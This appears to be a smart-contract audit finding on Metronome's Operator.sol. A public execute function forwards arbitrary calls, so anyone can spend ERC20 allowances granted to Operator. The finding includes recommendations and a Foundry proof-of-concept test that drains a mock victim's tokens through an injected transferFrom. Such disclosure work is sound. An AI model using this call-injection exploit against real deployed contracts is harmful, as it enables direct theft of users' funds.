### Title
Unauthenticated arbitrary-call execution through `Operator.execute` drains tokens approved to `Operator` - ([File: contracts/Operator.sol](contracts/Operator.sol))

### Summary
`Operator.execute` is publicly callable and executes attacker-selected `target`, `value`, and `callData` through `functionCallWithValue` from the `Operator` contract’s identity. Although `Operator` stores the initiating EOA in transient storage, ordinary ERC20 contracts do not consult `getActualMsgSender()`; they authorize the call based on `msg.sender == Operator`. Consequently, any token allowance granted to `Operator` can be consumed by anyone to transfer the victim’s tokens to an attacker-controlled address.

### Finding Description
The `execute` function accepts a fully attacker-controlled array of `Call` structs and performs each call without restricting the target, function selector, or calldata. Before execution, `setMsgSender` stores `msg.sender` in transient storage, but this identity is only meaningful to Metronome contracts implementing `SynthContext._msgSender`. Standard ERC20 tokens continue to see `msg.sender` as the `Operator` contract.

An attacker can therefore encode:

```solidity
token.transferFrom(victim, attacker, amount)
```

inside an `Operator.Call`. If `victim` has an allowance of at least `amount` to `Operator`, the token accepts the call because `msg.sender == Operator`. No victim signature, governor action, privileged role, malicious endpoint, or pre-existing protocol position is required beyond the allowance itself.

The non-reentrancy guard does not prevent this because no reentry is needed. The `msg.value == _sumOfValues` check does not prevent it because the malicious token call can use `value = 0`. Metronome’s `SynthContext` forwarding logic does not prevent it because the vulnerable call target is a normal ERC20 contract that only authenticates `msg.sender`.

### Impact Explanation
This breaks the expected authorization invariant that only the account that initiated `execute` can perform actions under its own authority. `Operator` separates the Metronome-level sender from the raw EVM caller, but external ERC20 allowances are bound to the raw caller. A public arbitrary-call function therefore converts every ERC20 allowance granted to `Operator` into publicly spendable allowance.

The attacker directly transfers approved user funds to themselves. A single call can drain the victim’s full approved balance of a token, and multiple token allowances can be drained in one `execute` batch. This qualifies as direct theft of user funds.

### Likelihood Explanation
Any unprivileged EOA can trigger the path. The only prerequisite is that a victim has approved the deployed `Operator` contract for an ERC20 token. Such approvals can result from users treating `Operator` as a protocol gateway or granting it allowance while attempting batched interactions. The exploit does not rely on oracle manipulation, governance misconfiguration, malicious callbacks, contract state corruption, or protocol-administrator behavior.

The deployed `Operator` artifacts expose the same public `execute((address,uint256,bytes)[])` ABI, while the implementation stores the initiating caller only in transient storage for Metronome-aware contracts to read.

### Recommendation
Do not expose unrestricted target and calldata execution from a contract that can hold token allowances. Prefer one of the following:

- Remove arbitrary calls and expose a fixed set of protocol operations.
- Maintain an allowlist of approved targets and selectors.
- For ERC20 interactions, ensure `Operator` never receives standing token allowances and clearly document that approving it is unsafe.
- Encode and validate each authorized operation instead of forwarding opaque `bytes`.
- At minimum, prohibit `transferFrom`-capable token targets and other externally authenticated calls where `msg.sender` grants authority.

### Proof of Concept
The following Foundry test demonstrates that an unprivileged attacker can consume a victim’s allowance to `Operator` by injecting an arbitrary ERC20 `transferFrom` call through `execute`.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import "forge-std/Test.sol";
import {Operator} from "../contracts/Operator.sol";
import {IOperator} from "../contracts/interfaces/IOperator.sol";

contract ERC20Mock {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(allowance[from][msg.sender] >= amount, "allowance");
        require(balanceOf[from] >= amount, "balance");

        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract OperatorArbitraryCallTest is Test {
    function test_publicExecuteDrainsAllowanceToOperator() public {
        Operator operator = new Operator();
        ERC20Mock token = new ERC20Mock();

        address victim = address(0xA11CE);
        address attacker = address(0xBAD);
        uint256 amount = 100 ether;

        token.mint(victim, amount);

        // The victim grants allowance to the deployed Operator contract.
        vm.prank(victim);
        token.approve(address(operator), amount);

        // Anyone can inject an arbitrary ERC20 transferFrom call.
        IOperator.Call[] memory calls = new IOperator.Call[](1);
        calls[0] = IOperator.Call({
            target: address(token),
            value: 0,
            callData: abi.encodeWithSelector(
                ERC20Mock.transferFrom.selector,
                victim,
                attacker,
                amount
            )
        });

        vm.prank(attacker);
        operator.execute(calls);

        assertEq(token.balanceOf(attacker), amount);
        assertEq(token.balanceOf(victim), 0);
    }
}
```

`Operator.execute` stores the attacker as the Metronome-level sender but calls the injected target with `msg.sender == Operator`; a standard ERC20 therefore authorizes the attacker-supplied `transferFrom` against the victim’s allowance to `Operator`. [1](#0-0) [2](#0-1) [3](#0-2)

### Citations

**File:** contracts/Operator.sol (L20-24)
```text
    modifier setMsgSender() {
        MSG_SENDER_STORAGE.asAddress().tstore(msg.sender);
        _;
        MSG_SENDER_STORAGE.asAddress().tstore(address(0));
    }
```

**File:** contracts/Operator.sol (L34-49)
```text
    function execute(
        Call[] calldata calls_
    ) external payable override nonReentrant setMsgSender returns (bytes[] memory _returnData) {
        uint256 _length = calls_.length;
        _returnData = new bytes[](_length);

        uint256 _sumOfValues;
        Call calldata _call;
        for (uint256 i; i < _length; ) {
            _call = calls_[i];
            uint256 _value = _call.value;
            unchecked {
                _sumOfValues += _value;
            }
            _returnData[i] = _call.target.functionCallWithValue(_call.callData, _value);
            unchecked {
```

**File:** contracts/utils/SynthContext.sol (L14-23)
```text
    function _msgSender() internal view virtual override returns (address) {
        IPoolRegistry _poolRegistry = poolRegistry();
        if (address(_poolRegistry) != address(0)) {
            IOperator _operator = _poolRegistry.operator();
            if (msg.sender == address(_operator)) {
                return _operator.getActualMsgSender();
            }
        }

        return msg.sender;
```
